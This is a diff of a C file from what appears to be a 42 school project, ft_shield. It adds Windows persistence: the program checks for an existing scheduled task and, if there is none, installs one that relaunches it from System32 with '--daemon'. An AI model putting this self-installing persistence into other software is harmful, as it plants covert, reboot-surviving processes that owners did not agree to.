@@ -6,7 +6,7 @@
 /*   By: zcadinot <zcadinot@student.42lehavre.      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/10/19 18:02:57 by zcadinot          #+#    #+#             */
-/*   Updated: 2026/10/20 16:54:44 by zcadinot         ###   ########.fr       */
+/*   Updated: 2026/10/20 17:34:07 by zcadinot         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -14,9 +14,10 @@
 #include <lmcons.h>
 #include <stdio.h>
 
-int mode_daemon()
+int mode_daemon(void)
 {
     HANDLE mutex = CreateMutexW(NULL, FALSE, L"Local\\MonApplicationMutex");
+    char   *path;
 
     if (mutex == NULL)
     {
@@ -31,15 +32,25 @@ int mode_daemon()
         CloseHandle(mutex);
         return (0);
     }
-    CloseHandle(mutex);
+    
+    if (!persistence_task_detect())
+    {
+        path = get_my_path();
+        if (path == NULL || !task_install(path, "--daemon"))
+        {
+            return (0);
+        }
+    }
+
     while (1)
     {
         continue;
     }
+    CloseHandle(mutex);
     return (1);
 }
 
-int mode_normal()
+int mode_normal(void)
 {
     if (!is_elevated())
         return (0);
@@ -75,7 +86,8 @@ int mode_normal()
         L"\"C:\\Windows\\System32\\ft_shield.exe\" --daemon";
 
     si.cb = sizeof(si);
-    if (!CreateProcessW(L"C:\\Windows\\System32\\ft_shield.exe", command_line, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
+    if (!CreateProcessW(L"C:\\Windows\\System32\\ft_shield.exe", command_line, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, 
+                L"C:\\Windows\\System32", &si, &pi))
     {
         printf("CreateProcessW erreur : %lu\n",
             (unsigned long)GetLastError());
